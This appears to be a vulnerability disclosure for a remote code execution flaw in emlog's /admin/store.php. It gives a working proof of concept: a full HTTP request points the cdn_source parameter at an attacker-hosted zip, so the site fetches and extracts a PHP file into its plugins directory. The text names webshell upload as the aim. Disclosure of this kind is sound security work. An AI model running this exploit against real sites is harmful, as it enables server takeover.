# emlog rce
## Affected version

â‰¤emlog v2.3.15

## Software

[https://github.com/emlog/emlog](https://github.com/emlog/emlog)

## vulnerability File

/admin/store.php

## Description

The latest version of emlog has a remote code execution vulnerability. Attackers can perform remote file downloads and self-extract to upload webshells to the target server, thereby obtaining system privileges.

## Detail

Create a new PHP file named "a.php", and the code is as follows:

```Java
<?php phpinfo();
```

Compress it into a.zip file. Start the web service locally, and the port is opened as 8000.

Access admin/store.php in the management background. Configure the parameter cdn_source as the address of a malicious server. The parameter source can be any value. 

The request packet is as follows.

```Java
GET /admin/store.php?action=install&cdn_source=http://192.168.154.150:8000/a.zip&&source=2 HTTP/1.1
Host: localhost
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/admin/data.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ujcms-visit-unique-visitor=8370467620055003; PHPSESSID=0su43jcbt6bsitq6ttmi963te2; EM_AUTHCOOKIE_FgmbSv6L54eLfwlkPJDpKVagFO5CIrjG=admin%7C0%7C6c209e43f8edcb3c3e80398be3040c8a
Connection: close


```

After sending this request, the local server receives the request and decompresses the malicious file to the content/plugins/ directory.


![image](https://github.com/user-attachments/assets/163c308c-017d-48cb-8927-c3e4637883a4)

![image](https://github.com/user-attachments/assets/0bd32d29-ec13-422e-8031-d567c57fa741)


access: [http://localhost/content/plugins/a.php](http://localhost/content/plugins/a.php) to obtain the execution result of a.php.


![image](https://github.com/user-attachments/assets/1be18d31-8fc1-48dc-b6d9-43aef76e6e9d)
